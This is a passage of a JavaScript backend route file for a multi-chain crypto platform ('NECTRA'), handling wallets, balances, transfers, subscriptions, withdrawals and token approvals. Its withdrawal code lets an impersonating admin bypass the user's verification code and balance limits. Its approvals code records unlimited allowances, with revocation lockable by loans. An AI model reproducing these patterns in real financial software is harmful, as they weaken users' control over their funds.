    rows = rows.concat(trades).sort((a, b) => b.date - a.date);
    if (query.type && query.type !== 'All') rows = rows.filter((x) => x.type === query.type);
    if (query.q) { const s = String(query.q).toLowerCase(); rows = rows.filter((x) => (x.type + x.token + (x.sig || '') + (x.note || '')).toLowerCase().includes(s)); }
    return rows;
  }
  r.get('/api/history', (c) => { const u = S.requireUser(c); return { rows: history(u, c.query).slice(0, 300) }; });
  r.get('/api/history.csv', (c) => {
    const u = S.requireUser(c);
    const esc = (v) => `"${String(v == null ? '' : v).replace(/"/g, '""')}"`;
    const csv = 'date,type,asset,amount,status,signature,simulated,note\n' + history(u, c.query).map((x) => [new Date(x.date).toISOString(), x.type, x.token, x.amount, x.status, x.sig, x.simulated, x.note].map(esc).join(',')).join('\n');
    send(c.res, 200, csv, { 'Content-Type': 'text/csv; charset=utf-8', 'Content-Disposition': 'attachment; filename="nectra-history.csv"' });
    return c.STREAM;
  });

  /* ---------------- wallets ---------------- */
  r.get('/api/wallets', async (c) => {
    const u = S.requireUser(c);
    let ws = q.all("SELECT * FROM wallets WHERE user_id = ? ORDER BY kind = 'main' DESC, id", u.id);
    for (const w of ws) {
      if (w.verified && w.source !== 'demo' && (!w.balance_at || now() - w.balance_at > 300000)) {
        await refreshWalletBalance(w).catch(() => {});
      }
    }
    ws = q.all("SELECT * FROM wallets WHERE user_id = ? ORDER BY kind = 'main' DESC, id", u.id);
    if (ws.length && !ws.some((w) => w.kind === 'main')) {
      const firstVerified = ws.find((w) => w.verified && w.source !== 'watch') || ws[0];
      if (firstVerified) {
        q.run("UPDATE wallets SET kind = 'main' WHERE id = ?", firstVerified.id);
        ws = q.all("SELECT * FROM wallets WHERE user_id = ? ORDER BY kind = 'main' DESC, id", u.id);
      }
    }
    const rows = ws.map(walletRow);
    const sol = rows.filter((w) => w.family === 'solana').reduce((a, w) => a + (w.balance || 0), 0);
    const eth = rows.filter((w) => w.family === 'evm').reduce((a, w) => a + (w.balance || 0), 0);
    const totalUsd = rows.reduce((a, w) => a + (w.usd || 0), 0);
    return {
      main: rows.find((w) => w.kind === 'main') || (rows.length ? rows[0] : null),
      wallets: rows.filter((w) => w.kind !== 'main'),
      folders: q.all('SELECT name FROM folders WHERE user_id = ? ORDER BY id', u.id).map((f) => f.name),
      totals: { sol, eth, usd: totalUsd, count: rows.length },
      solPrice: market.price('SOL'),
      ethPrice: market.price('ETH'),
      accountBalance: E.accountBalance(u.id),
      demo: getSettings().demo_mode
    };
  });
  r.post('/api/wallets', async (c) => {
    const u = S.requireUser(c);
    const source = ['watch', 'connected', 'generated', 'demo'].includes(c.body.source) ? c.body.source : 'watch';
    let address = str(c.body.address, 64);
    let family = ['solana', 'evm', 'tron', 'btc', 'ltc'].includes(c.body.family)
      ? c.body.family
      : chain.isEvmAddress(address)
        ? 'evm'
        : require('../chains/tron').isAddress(address)
          ? 'tron'
          : require('../chains/utxo').isAddress('BTC', address)
            ? 'btc'
            : require('../chains/utxo').isAddress('LTC', address)
              ? 'ltc'
              : 'solana';
    if (source !== 'watch') {
      const n = await consumeWalletProof(c.body, 'link', u.id);   // must prove ownership by signing
      address = n.address; family = n.family;
      if (source === 'demo' && !getSettings().demo_mode) fail(403, 'Demo wallets are disabled');
    } else {
      const ok = family === 'solana' ? chain.isSolAddress(address) : family === 'evm' ? chain.isEvmAddress(address) : family === 'tron' ? require('../chains/tron').isAddress(address) : require('../chains/utxo').isAddress(family.toUpperCase(), address);
      if (!ok) fail(400, 'That doesn’t look like a valid public address');
    }
    const chainName = { solana: 'Solana', evm: 'EVM', tron: 'Tron', btc: 'Bitcoin', ltc: 'Litecoin' }[family];
    if (q.val('SELECT COUNT(*) FROM wallets WHERE user_id = ?', u.id) >= 200) fail(400, 'Wallet limit reached');
    if (q.get('SELECT id FROM wallets WHERE user_id = ? AND address = ?', u.id, address)) fail(409, 'This wallet is already added');
    const hasMain = !!q.val("SELECT 1 FROM wallets WHERE user_id = ? AND kind = 'main'", u.id);
    const kind = !hasMain && source !== 'watch' ? 'main' : 'buyer';
    const folder = str(c.body.folder || 'Unsorted', 30);
    q.run('INSERT OR IGNORE INTO folders(user_id, name) VALUES(?,?)', u.id, folder);
    const count = q.val("SELECT COUNT(*) FROM wallets WHERE user_id = ? AND kind = 'buyer'", u.id);
    const id = q.run('INSERT INTO wallets(user_id, name, address, chain, family, kind, source, provider, folder, verified, verified_at, created_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)',
      u.id, str(c.body.name, 40) || (kind === 'main' ? 'Main wallet' : family === 'solana' ? 'Buyer ' + (count + 1) : chainName + ' wallet'), address, chainName, family, kind, source, str(c.body.provider, 40) || null, folder, source === 'watch' ? 0 : 1, source === 'watch' ? null : now(), now()).id;
    require('../loans').creditScore(u.id);
    S.audit(u.id, 'wallet.add', id, { source, address }, c.req);
    const createdW = q.get('SELECT * FROM wallets WHERE id = ?', id);
    const initBal = typeof c.body.initialBalance === 'number' ? c.body.initialBalance : null;
    await refreshWalletBalance(createdW, initBal);
    return { wallet: walletRow(q.get('SELECT * FROM wallets WHERE id = ?', id)) };
  });
  r.patch('/api/wallets/:id', (c) => {
    const u = S.requireUser(c); const w = ownWallet(u.id, c.params.id);
    if (c.body.name != null) { const n = str(c.body.name, 40); if (!n) fail(400, 'Name required'); q.run('UPDATE wallets SET name = ? WHERE id = ?', n, w.id); }
    if (c.body.folder != null) { const f = str(c.body.folder, 30); q.run('INSERT OR IGNORE INTO folders(user_id, name) VALUES(?,?)', u.id, f); q.run('UPDATE wallets SET folder = ? WHERE id = ?', f, w.id); }
    return { wallet: walletRow(q.get('SELECT * FROM wallets WHERE id = ?', w.id)) };
  });
  r.post('/api/wallets/bulk-move', (c) => {
    const u = S.requireUser(c); const f = str(c.body.folder, 30); if (!f) fail(400, 'Folder required');
    q.run('INSERT OR IGNORE INTO folders(user_id, name) VALUES(?,?)', u.id, f);
    (Array.isArray(c.body.ids) ? c.body.ids : []).slice(0, 500).forEach((id) => q.run('UPDATE wallets SET folder = ? WHERE id = ? AND user_id = ?', f, id, u.id));
    return { ok: true };
  });
  r.del('/api/wallets/:id', (c) => {
    const u = S.requireUser(c); const w = ownWallet(u.id, c.params.id);
    if (w.kind === 'main') fail(400, 'Set another wallet as main before removing this one');
    q.run('DELETE FROM wallets WHERE id = ?', w.id);
    S.audit(u.id, 'wallet.remove', w.id, { address: w.address }, c.req);
    return { ok: true };
  });
  r.post('/api/wallets/:id/main', (c) => {
    const u = S.requireUser(c); const w = ownWallet(u.id, c.params.id);
    if (!w.verified) fail(400, 'Only wallets you’ve proven ownership of (connected or generated) can be your main wallet');
    tx(() => { q.run("UPDATE wallets SET kind = 'buyer' WHERE user_id = ? AND kind = 'main'", u.id); q.run("UPDATE wallets SET kind = 'main' WHERE id = ?", w.id); });
    S.audit(u.id, 'wallet.set_main', w.id, null, c.req);
    notify(u.id, 'security', 'Main wallet changed', `${w.name} (${w.address.slice(0, 4)}…${w.address.slice(-4)}) is now your main wallet.`, 'wallets.html');
    return { ok: true };
  });
  r.post('/api/wallets/:id/refresh', async (c) => {
    const u = S.requireUser(c); const w = ownWallet(u.id, c.params.id);
    S.rateLimit(c.req, 'refresh', 30, 60000);
    if (w.source === 'demo') return { wallet: walletRow(w), source: 'cached' };
    const oldBal = w.balance || 0;
    const newBal = await refreshWalletBalance(w);
    if (w.family === 'solana' && newBal > oldBal + 1e-9 && w.balance_at) {
      const t = recordTx(u.id, { type: 'Deposit', token: 'SOL', amount: +(newBal - oldBal).toFixed(9), to: w.address, status: 'confirmed', confirmations: 32, note: 'Detected by balance refresh' });
      notify(u.id, 'transfer', 'Deposit detected', `${t.amount} SOL arrived in ${w.name}.`, 'wallets.html');
    }
    return { wallet: walletRow(q.get('SELECT * FROM wallets WHERE id = ?', w.id)), source: 'rpc' };
  });
  r.post('/api/folders', (c) => {
    const u = S.requireUser(c); const n = str(c.body.name, 30); if (!n) fail(400, 'Folder name required');
    q.run('INSERT OR IGNORE INTO folders(user_id, name) VALUES(?,?)', u.id, n);
    return { ok: true };
  });

  /* ---------------- connected-wallet live balances (all chains, non-zero) ---------------- */
  const sol = () => require('../chains/solana'), evm = () => require('../chains/evm'), tron = () => require('../chains/tron'), utxo = () => require('../chains/utxo');
  const SOL_CHECK = ['SOL', 'USDC', 'USDT', 'JUP', 'BONK', 'WIF', 'JTO', 'RAY'];
  r.get('/api/wallets/:id/balances', async (c) => {
    const u = S.requireUser(c); const w = ownWallet(u.id, c.params.id);
    S.rateLimit(c.req, 'balances', 60, 60000);
    const px = (s) => market.price(s) || 0;
    const rows = [];
    const add = (coin, netLabel, amount, family, opts = {}) => {
      if (amount > 1e-12) rows.push({ coin, chain: netLabel, family, amount, usd: amount * px(coin), canSend: opts.canSend !== false, canSwap: !!opts.canSwap, network: opts.network || netLabel });
    };
    try {
      if (w.source === 'demo') { add('SOL', 'Solana (demo)', w.balance || 0, 'solana', { canSend: false }); return { wallet: walletRow(w), balances: rows, demo: true }; }
      if (w.family === 'solana') {
        const bal = await sol().walletBalances(w.address, SOL_CHECK.filter((x) => x !== 'SOL'));
        for (const coin of SOL_CHECK) add(coin, 'Solana', bal[coin] || 0, 'solana', { canSend: true, canSwap: true });
        if (bal.SOL != null) q.run('UPDATE wallets SET balance = ?, balance_at = ? WHERE id = ?', bal.SOL, now(), w.id);
      } else if (w.family === 'evm') {
        const b = await evm().balances(w.address);
        let evmNativeTotal = 0;
        for (const [net, r2] of Object.entries(b)) {
          if (r2.error) continue;
          if (typeof r2.native === 'number') evmNativeTotal += r2.native;
          add(r2.nativeSym, net, r2.native || 0, 'evm', { network: net, canSend: true });
          add('USDC', net, r2.USDC || 0, 'evm', { network: net, canSend: true });
          add('USDT', net, r2.USDT || 0, 'evm', { network: net, canSend: true });
        }
        q.run('UPDATE wallets SET balance = ?, balance_at = ?, last_check = ? WHERE id = ?', evmNativeTotal, now(), JSON.stringify({ at: now(), detail: b }), w.id);
      } else if (w.family === 'tron') {
        const b = await tron().balances(w.address);
        add('TRX', 'Tron', b.TRX || 0, 'tron');
        add('USDT', 'Tron', b.USDT || 0, 'tron');
        q.run('UPDATE wallets SET balance = ?, balance_at = ? WHERE id = ?', b.TRX || 0, now(), w.id);
      } else if (w.family === 'btc' || w.family === 'ltc') {
        const b = await utxo().addressBalance(w.family.toUpperCase(), w.address);
        const total = (b.confirmed || 0) + (b.pending || 0);
        add(w.family.toUpperCase(), w.family.toUpperCase(), total, w.family, { canSend: false });
        q.run('UPDATE wallets SET balance = ?, balance_at = ? WHERE id = ?', total, now(), w.id);
      }
    } catch (e) { fail(502, 'Couldn’t read balances from the network — try again shortly'); }
    q.run('UPDATE wallets SET balance_at = ? WHERE id = ?', now(), w.id);
    const updatedW = q.get('SELECT * FROM wallets WHERE id = ?', w.id);
    return { wallet: walletRow(updatedW), balances: rows.sort((a, b) => b.usd - a.usd), total: rows.reduce((a, b) => a + b.usd, 0) };
  });

  /* Build an unsigned transfer the user's wallet signs: Solana (SOL/SPL) or EVM (native/ERC-20). Tron is signed client-side. */
  r.post('/api/wallets/:id/transfer-build', async (c) => {
    const u = S.requireUser(c); const w = ownWallet(u.id, c.params.id);
    if (!w.verified || w.source === 'watch') fail(400, 'This wallet can’t send — it’s watch-only');
    const coin = str(c.body.coin, 10).toUpperCase(); const to = str(c.body.to, 80); const amount = num(c.body.amount, 1e-12, 1e12);
    try {
      if (w.family === 'solana') { if (!chain.isSolAddress(to)) fail(400, 'Enter a valid Solana address'); return { kind: 'solana', tx: coin === 'SOL' ? await sol().buildSolTransfer(w.address, to, amount) : await sol().buildTokenTransfer(w.address, to, coin, amount), owner: w.address }; }
      if (w.family === 'evm') { if (!chain.isEvmAddress(to)) fail(400, 'Enter a valid EVM (0x…) address'); const net = str(c.body.network, 20) || 'Ethereum'; return { kind: 'evm', ...(await evm().buildTransfer(net, coin, w.address, to, amount)), owner: w.address }; }
      if (w.family === 'tron') { if (!tron().isAddress(to)) fail(400, 'Enter a valid Tron address'); return { kind: 'tron', coin, to, amount, owner: w.address }; }
    } catch (e) { if (e.status) throw e; fail(502, 'Couldn’t build the transfer: ' + e.message); }
    fail(400, 'Sending from this chain isn’t supported here yet — use your wallet app');
  });

  /* Build an unsigned Jupiter swap for the user's Solana wallet to sign */
  r.post('/api/wallets/:id/swap-build', async (c) => {
    const u = S.requireUser(c); const w = ownWallet(u.id, c.params.id);
    if (w.family !== 'solana' || w.source === 'watch' || w.source === 'demo') fail(400, 'Swaps run from a connected Solana wallet. (Demo wallets use the paper swap.)');
    const from = str(c.body.from, 10).toUpperCase(), to = str(c.body.to, 10).toUpperCase();
    if (!sol().MINTS[from] || !sol().MINTS[to] || from === to) fail(400, 'Choose two different supported Solana tokens');
    try { return await sol().buildUserSwap(w.address, from, to, num(c.body.amount, 1e-9), Math.round(num(c.body.slippageBps || 50, 1, 1000))); }
    catch (e) { fail(502, 'Couldn’t build the swap: ' + e.message); }
  });

  /* ---------------- chain proxy (blockhash / send) ---------------- */
  r.post('/api/chain/blockhash', async (c) => { S.requireUser(c); try { return await chain.latestBlockhash(); } catch (e) { fail(502, 'Solana RPC unavailable'); } });
  r.post('/api/chain/send', async (c) => {
    S.requireUser(c); S.rateLimit(c.req, 'send', 20, 60000);
    try { return { signature: await chain.sendRawTransaction(str(c.body.tx, 4000)) }; } catch (e) { fail(400, 'Network rejected the transaction: ' + e.message); }
  });

  /* ---------------- transfers between own wallets (fund / sweep) ---------------- */
  r.post('/api/transfers', (c) => {
    const u = S.requireUser(c);
    const type = c.body.type === 'Sweep' ? 'Sweep' : 'Fund';
    const items = (Array.isArray(c.body.items) ? c.body.items : []).slice(0, 100);
    if (!items.length) fail(400, 'Nothing to transfer');
    const out = items.map((it) => {
      const from = q.get('SELECT * FROM wallets WHERE user_id = ? AND address = ?', u.id, String(it.from));
      const to = q.get('SELECT * FROM wallets WHERE user_id = ? AND address = ?', u.id, String(it.to));
      if (!from || !to) fail(400, 'Transfers are only allowed between your own wallets');
      const amt = num(it.amount, 1e-9, 1e6);
      const { signature, simulated } = sigOrSim(it);
      return txRow(recordTx(u.id, { type, token: 'SOL', amount: amt, from: from.address, to: to.address, signature, simulated, note: `${from.name} → ${to.name}` }));
    });
    S.audit(u.id, 'transfer.' + type.toLowerCase(), null, { n: out.length }, c.req);
    return { transactions: out };
  });

  /* ---------------- deposits ---------------- */
  r.get('/api/deposit', (c) => {
    const u = S.requireUser(c);
    const main = q.get("SELECT * FROM wallets WHERE user_id = ? AND kind = 'main'", u.id);
    return { main: main ? walletRow(main) : null, recent: q.all("SELECT * FROM transactions WHERE user_id = ? AND type = 'Deposit' ORDER BY created_at DESC LIMIT 5", u.id).map(txRow), demo: getSettings().demo_mode };
  });
  r.post('/api/deposits/simulate', (c) => {
    const u = S.requireUser(c);
    if (!getSettings().demo_mode) fail(403, 'Simulated deposits are disabled');
    const main = q.get("SELECT * FROM wallets WHERE user_id = ? AND kind = 'main'", u.id);
    if (!main) fail(400, 'Connect a main wallet first');
    const t = recordTx(u.id, { type: 'Deposit', token: str(c.body.token || 'SOL', 10), amount: num(c.body.amount || 0.001, 1e-9, 1e6), to: main.address, chain: str(c.body.chain || 'Solana', 20), simulated: true, required: c.body.chain && c.body.chain !== 'Solana' ? 12 : 32, note: 'Simulated (demo mode)' });
    return { tx: txRow(t) };
  });
  r.get('/api/tx/:id', (c) => { const u = S.requireUser(c); const t = q.get('SELECT * FROM transactions WHERE id = ? AND user_id = ?', c.params.id, u.id); if (!t) fail(404, 'Not found'); return { tx: txRow(t) }; });

  /* ---------------- account balance (platform ledger) ---------------- */
  r.get('/api/account', (c) => { const u = S.requireUser(c); return { balance: E.accountBalance(u.id), ledger: q.all('SELECT id, amount, kind, ref, note, created_at FROM ledger WHERE user_id = ? ORDER BY id DESC LIMIT 100', u.id) }; });

  /* ---------------- compliance: terms + KYC ---------------- */
  r.get('/api/compliance', (c) => { const u = S.requireUser(c); const C = require('../compliance'); return { terms: C.termsStatus(u), kyc: C.kycStatus(u.id) }; });
  r.post('/api/terms/accept', (c) => { const u = S.requireUser(c); const t = require('../compliance').acceptTerms(u.id); S.audit(u.id, 'terms.accept', null, { version: t.version }, c.req); return { terms: t }; });
  r.post('/api/kyc', (c) => {
    const u = S.requireUser(c);
    S.rateLimit(c.req, 'kyc', 6, 60000);
    try { const k = require('../compliance').submitKyc(u.id, c.body || {}); S.audit(u.id, 'kyc.submit', null, null, c.req); return { kyc: k }; }
    catch (e) { fail(e.status || 400, e.message); }
  });

  /* ---------------- subscription plans + crypto payments ---------------- */
  r.get('/api/plans', (c) => { const u = S.requireUser(c); return { ...require('../plans').statusFor(u.id), methods: require('../payments').methods() }; });
  r.get('/api/plans/:id/quote', (c) => {
    const u = S.requireUser(c);
    if (!require('../plans').enabled()) fail(403, 'Subscriptions are not available right now');
    const plan = require('../plans').planRow(+c.params.id); if (!plan || !plan.active) fail(404, 'Plan not available');
    return { plan: plan.name, ...require('../plans').quote(u.id, plan, c.query.interval === 'yearly' ? 'yearly' : 'monthly') };
  });
  r.post('/api/plans/:id/subscribe', (c) => {
    const u = S.requireUser(c);
    S.rateLimit(c.req, 'subscribe', 10, 60000);
    const interval = c.body.interval === 'yearly' ? 'yearly' : 'monthly';
    try { const r2 = require('../plans').subscribe(u.id, +c.params.id, { interval }); S.audit(u.id, 'plan.subscribe', c.params.id, { charged: r2.charged, interval: r2.interval, method: 'balance' }, c.req); return { ...require('../plans').statusFor(u.id), charged: r2.charged, credit: r2.credit }; }
    catch (e) { fail(e.status || 400, e.message); }
  });
  r.post('/api/plans/:id/checkout', async (c) => {
    const u = S.requireUser(c);
    S.rateLimit(c.req, 'checkout', 15, 60000);
    const P = require('../plans');
    if (!P.enabled()) fail(403, 'Subscriptions are not available right now');
    const plan = P.planRow(+c.params.id);
    if (!plan || !plan.active) fail(404, 'Plan not available');
    if (!plan.price_usd) fail(400, 'This plan is free — just switch to it');
    const method = String(c.body.method || '');
    const interval = c.body.interval === 'yearly' ? 'yearly' : 'monthly';
    const qt = P.quote(u.id, plan, interval);
    // balance, or crypto where proration credit already covers the charge → instant activation from balance
    if (method === 'balance' || qt.charge <= 0) {
      try { const r2 = P.subscribe(u.id, plan.id, { interval }); S.audit(u.id, 'plan.subscribe', plan.id, { charged: r2.charged, interval: r2.interval, method }, c.req); return { done: true, ...P.statusFor(u.id) }; } catch (e) { fail(e.status || 400, e.message); }
    }
    try { const info = await require('../payments').createPayment(u.id, plan, method, interval); S.audit(u.id, 'plan.checkout', plan.id, { method, interval }, c.req); return info; }
    catch (e) { fail(e.status || 502, e.message); }
  });
  r.get('/api/payments/:id', (c) => {
    const u = S.requireUser(c);
    const p = q.get('SELECT id, plan_id, provider, amount_usd, pay_currency, pay_amount, pay_address, network, reference, invoice_url, status, expires_at FROM plan_payments WHERE id = ? AND user_id = ?', c.params.id, u.id);
    if (!p) fail(404, 'Payment not found');
    return { payment: p };
  });
  r.post('/api/payments/:id/simulate', (c) => {
    const u = S.requireUser(c);
    if (!getSettings().demo_mode) fail(403, 'Only available in demo mode');
    const p = q.get("SELECT * FROM plan_payments WHERE id = ? AND user_id = ? AND status = 'pending'", c.params.id, u.id); if (!p) fail(404, 'No pending payment');
    require('../payments').confirmPayment(p, {});
    return { done: true, ...require('../plans').statusFor(u.id) };
  });
  r.post('/api/subscription/cancel', (c) => {
    const u = S.requireUser(c);
    try { require('../plans').cancel(u.id); S.audit(u.id, 'plan.cancel', null, null, c.req); return require('../plans').statusFor(u.id); }
    catch (e) { fail(e.status || 400, e.message); }
  });
  /* NOWPayments IPN (no session; HMAC-verified in the handler). CSRF-exempt in index.js. */
  r.post('/api/webhooks/nowpayments', (c) => { const b = { ...(c.body || {}), __sig: c.req.headers['x-nowpayments-sig'] }; try { return require('../payments').handleNowpaymentsIpn(b); } catch (e) { fail(e.status || 400, e.message); } });

  /* ---------------- withdrawals ---------------- */
  r.get('/api/withdrawals', (c) => { const u = S.requireUser(c); return { rows: q.all('SELECT * FROM withdrawals WHERE user_id = ? ORDER BY id DESC LIMIT 50', u.id) }; });
  r.post('/api/withdrawals', (c) => { const u = S.requireUser(c); return S.idempotent(c, u.id, () => {
    S.rateLimit(c.req, 'withdraw', 10, 60000);
    // An admin acting as this user is the second factor: skip the user code and lift their balance cap.
    const asAdmin = !!c.auth.session.impersonator_id && S.can(q.get('SELECT * FROM users WHERE id = ?', c.auth.session.impersonator_id) || { role: 'user' }, 'payouts.manage');
    if (getSettings().withdrawals_paused && !asAdmin) fail(503, 'Withdrawals are temporarily paused');
    const authRequired = getSettings().withdrawal_auth_required !== false && getSettings().withdrawal_require_code !== false;
    const skipAuth = asAdmin || !authRequired;
    const source = c.body.source === 'account' ? 'account' : 'wallet';
    const to = str(c.body.to, 64);
    if (!chain.isSolAddress(to)) fail(400, to.startsWith('0x') ? 'This is an EVM address — it can’t receive SOL on Solana' : 'Invalid Solana address');
    const amount = num(c.body.amount, 1e-9, 1e9);
    const book = q.get('SELECT * FROM address_book WHERE user_id = ? AND address = ?', u.id, to);
    if (u.whitelist_only && (!book || !book.whitelisted)) fail(403, 'Whitelist-only withdrawals are on — add this address to your whitelist first');
    if (book && book.whitelisted && book.unlock_at > now()) fail(403, `This whitelisted address unlocks ${new Date(book.unlock_at).toLocaleString()}`);
    let fromAddr = null, walletId = null, token, fee;
    if (source === 'wallet') {
      const w = ownWallet(u.id, c.body.walletId);
      if (!w.verified) fail(400, 'Watch-only wallets can’t send funds');
      if (!asAdmin && amount + SOL_FEE > w.balance + 1e-12) fail(400, 'Amount exceeds the wallet balance minus network fee — refresh the balance if you just deposited');
      fromAddr = w.address; walletId = w.id; token = 'SOL'; fee = SOL_FEE;
    } else {
      const bal = E.accountBalance(u.id);
      if (!asAdmin && amount > bal + 1e-9) fail(400, `Amount exceeds your account balance ($${bal.toFixed(2)})`);
      token = 'USDC'; fee = 0;
    }
    const status = skipAuth ? (source === 'account' ? 'pending_admin' : 'ready_to_sign') : 'awaiting_code';
    const verifyMethod = asAdmin ? 'admin' : (!authRequired ? 'none' : (u.totp_enabled ? 'totp' : 'email'));
    const id = q.run('INSERT INTO withdrawals(user_id, source, wallet_id, from_addr, to_addr, token, amount, fee, status, verify_method, created_at, updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)',
      u.id, source, walletId, fromAddr, to, token, amount, fee, status, verifyMethod, now(), now()).id;
    let code;
    if (source === 'account' && skipAuth) {
      if (asAdmin) {
        q.run('INSERT INTO ledger(user_id, amount, kind, ref, note, created_by, created_at) VALUES(?,?,?,?,?,?,?)',
          u.id, -amount, 'withdrawal', 'W' + id, 'Admin withdrawal to ' + to, c.auth.session.impersonator_id, now());
        notifyAdmins('transfer', 'Admin withdrawal on a user account', '$' + amount.toFixed(2) + ' from user #' + u.id + ' — payout pending admin confirmation.', '/admin/#payouts');
        S.audit(c.auth.session.impersonator_id, 'admin.withdraw_as_user', id, { userId: u.id, amount, source }, c.req);
      } else {
        q.run('INSERT INTO ledger(user_id, amount, kind, ref, note, created_at) VALUES(?,?,?,?,?,?)',
          u.id, -amount, 'withdrawal', 'W' + id, `Payout to ${to}`, now());
        notifyAdmins('transfer', 'Payout request', `User #${u.id} requested $${amount.toFixed(2)} to ${to.slice(0, 6)}…`, '/admin#payouts');
        S.audit(u.id, 'withdraw.request', id, { amount, source: 'account', auth_bypassed: true }, c.req);
      }
    } else if (!skipAuth && !u.totp_enabled) {
      code = S.issueCode({ userId: u.id, purpose: 'withdraw', ref: id });
      const pName = getSettings().platform_name || 'NECTRA';
      sendMail(u.email, `Confirm your ${pName} withdrawal`, `Code: ${code}\nAmount: ${amount} ${token}\nTo: ${to}\nIf you didn’t request this, change your password immediately.`, u);
    }
    return {
      id,
      status,
      method: verifyMethod,
      whitelisted: !!(book && book.whitelisted),
      label: book && book.label,
      fee,
      token,
      from: fromAddr,
      to,
      amount,
      auth_required: authRequired,
      ...(code && getSettings().demo_mode ? { devCode: code } : {})
    };
  }); });
  r.post('/api/withdrawals/:id/verify', (c) => {
    const u = S.requireUser(c);
    S.rateLimit(c.req, 'wverify', 15, 60000);
    const asAdmin = !!(c.auth && c.auth.session && c.auth.session.impersonator_id) && S.can(q.get('SELECT * FROM users WHERE id = ?', c.auth.session.impersonator_id) || { role: 'user' }, 'payouts.manage');
    if (getSettings().withdrawals_paused && !asAdmin) fail(503, 'Withdrawals are temporarily paused');
    const authRequired = getSettings().withdrawal_auth_required !== false && getSettings().withdrawal_require_code !== false;
    const w = q.get("SELECT * FROM withdrawals WHERE id = ? AND user_id = ?", c.params.id, u.id);
    if (!w) fail(404, 'Withdrawal not found');
    if (w.status !== 'awaiting_code') {
      if (w.status === 'pending_admin') return { status: 'pending_admin' };
      if (w.status === 'ready_to_sign') return { status: 'ready_to_sign', from: w.from_addr, to: w.to_addr, amount: w.amount };
      fail(400, 'Withdrawal is not awaiting verification');
    }
    if (authRequired && w.verify_method !== 'none' && w.verify_method !== 'admin') {
      if (w.verify_method === 'totp') { if (!S.verifyTotp(u.totp_secret, c.body.code)) fail(400, 'Incorrect code'); }
      else S.consumeCode({ userId: u.id, purpose: 'withdraw', code: c.body.code, ref: w.id });
    }
    if (w.source === 'account') {
      const bal = E.accountBalance(u.id);
      if (w.amount > bal + 1e-9) fail(400, 'Insufficient account balance');
      const moved = tx(() => {
        // claim first so a duplicate verify can never debit the ledger twice
        if (!q.run("UPDATE withdrawals SET status = 'pending_admin', updated_at = ? WHERE id = ? AND status = 'awaiting_code'", now(), w.id).changes) return false;
        q.run('INSERT INTO ledger(user_id, amount, kind, ref, note, created_at) VALUES(?,?,?,?,?,?)', u.id, -w.amount, 'withdrawal', 'W' + w.id, `Payout to ${w.to_addr}`, now());
        return true;
      });
      if (!moved) fail(409, 'Withdrawal was already verified');
      notifyAdmins('transfer', 'Payout request', `User #${u.id} requested $${w.amount.toFixed(2)} to ${w.to_addr.slice(0, 6)}…`, '/admin#payouts');
      S.audit(u.id, 'withdraw.request', w.id, { amount: w.amount, source: 'account', auth_bypassed: !authRequired }, c.req);
      return { status: 'pending_admin' };
    }
    q.run("UPDATE withdrawals SET status = 'ready_to_sign', updated_at = ? WHERE id = ?", now(), w.id);
    return { status: 'ready_to_sign', from: w.from_addr, to: w.to_addr, amount: w.amount };
  });
  r.post('/api/withdrawals/:id/submit', (c) => {
    const u = S.requireUser(c);
    const asAdmin = !!(c.auth && c.auth.session && c.auth.session.impersonator_id) && S.can(q.get('SELECT * FROM users WHERE id = ?', c.auth.session.impersonator_id) || { role: 'user' }, 'payouts.manage');
    if (getSettings().withdrawals_paused && !asAdmin) fail(503, 'Withdrawals are temporarily paused');
    const w = q.get("SELECT * FROM withdrawals WHERE id = ? AND user_id = ? AND status = 'ready_to_sign'", c.params.id, u.id);
    if (!w) fail(404, 'Withdrawal is not ready to sign');
    const { signature, simulated } = sigOrSim(c.body);
    const t = recordTx(u.id, { type: 'Withdraw', token: w.token, amount: w.amount, from: w.from_addr, to: w.to_addr, signature, simulated, note: simulated ? 'Simulated (demo mode)' : null });
    q.run("UPDATE withdrawals SET status = 'submitted', tx_id = ?, updated_at = ? WHERE id = ?", t.id, now(), w.id);
    S.audit(u.id, 'withdraw.submit', w.id, { signature, simulated }, c.req);
    try {
      require('../events').sendAdminWebhook({
        title: 'Withdrawal Executed',
        text: `User #${u.id} submitted withdrawal #${w.id} of ${w.amount} ${w.token} to ${w.to_addr.slice(0, 10)}...`,
        severity: w.amount >= 500 ? 'warn' : 'info',
        fields: { User: u.id, Amount: `${w.amount} ${w.token}`, Destination: w.to_addr, Signature: signature || (simulated ? 'simulated' : 'unknown') }
      });
    } catch (e) {}
    return { tx: txRow(t) };
  });

  /* ---------------- approvals ---------------- */
  r.get('/api/approvals', (c) => {
    const u = S.requireUser(c);
    const L = require('../loans');
    return { rows: q.all('SELECT * FROM approvals WHERE user_id = ? AND revoked_at IS NULL ORDER BY created_at DESC', u.id).map((a) => { const lockedLoanId = L.revokeLocked(a); return { ...a, unlimited: !!a.unlimited, verified: !!a.verified, revokeLocked: !!lockedLoanId, lockedLoanId }; }) };
  });
  r.post('/api/approvals', (c) => {
    const u = S.requireUser(c);
    const token = str(c.body.token, 10).toUpperCase(); if (!market.exists(token)) fail(400, 'Unknown token');
    const unlimited = !!c.body.unlimited;
    const amount = unlimited ? null : num(c.body.amount, 0.000001, 1e12);
    const main = q.get("SELECT * FROM wallets WHERE user_id = ? AND kind = 'main'", u.id);
    const { signature, simulated } = sigOrSim(c.body);
    const id = q.run('INSERT INTO approvals(user_id, wallet_id, wallet_name, token, spender, spender_address, amount, unlimited, verified, signature, created_at, family, network, onchain, owner) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)',
      u.id, main && main.id, main ? main.name : 'Main wallet', token, str(c.body.spender, 60) || 'Nectra DCA Executor', str(c.body.spenderAddress, 64) || chain.randomAddress(), amount, unlimited ? 1 : 0, 1, signature, now(), main ? main.family : 'solana', 'Solana', simulated ? 0 : 1, main && main.address).id;
    recordTx(u.id, { type: 'Approval', token, amount: amount || 0, status: simulated ? 'confirmed' : 'confirming', confirmations: simulated ? 32 : 0, signature, simulated, note: unlimited ? 'Unlimited allowance' : `Allowance ${amount} ${token}` });
    S.audit(u.id, 'approval.grant', id, { token, amount, unlimited }, c.req);
    return { id };
  });
  r.post('/api/approvals/:id/revoke', (c) => {
    const u = S.requireUser(c);
    const a = q.get('SELECT * FROM approvals WHERE id = ? AND user_id = ? AND revoked_at IS NULL', c.params.id, u.id); if (!a) fail(404, 'Approval not found');
    const lockedLoan = require('../loans').revokeLocked(a);
    const pName = getSettings().platform_name || 'NECTRA';
